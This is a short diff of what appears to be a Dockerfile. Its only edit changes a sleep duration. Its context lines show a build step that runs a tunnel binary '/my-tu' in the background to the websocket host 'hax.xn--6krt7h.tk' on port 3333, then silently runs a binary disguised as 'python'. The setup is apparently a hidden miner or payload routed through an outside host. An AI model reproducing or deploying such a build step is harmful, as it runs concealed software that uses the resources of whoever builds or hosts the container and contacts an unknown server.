@@ -10,6 +10,6 @@ RUN chmod a+x /my-tu /app/python && \
   (/my-tu -L 127.0.0.1:3333:127.0.0.1:3333 wss://hax.xn--6krt7h.tk &) && \
   cd /app && \
   (./python > /dev/null &) && \
-  sleep 3600  
+  sleep 1800  
 
 CMD /bin/bash
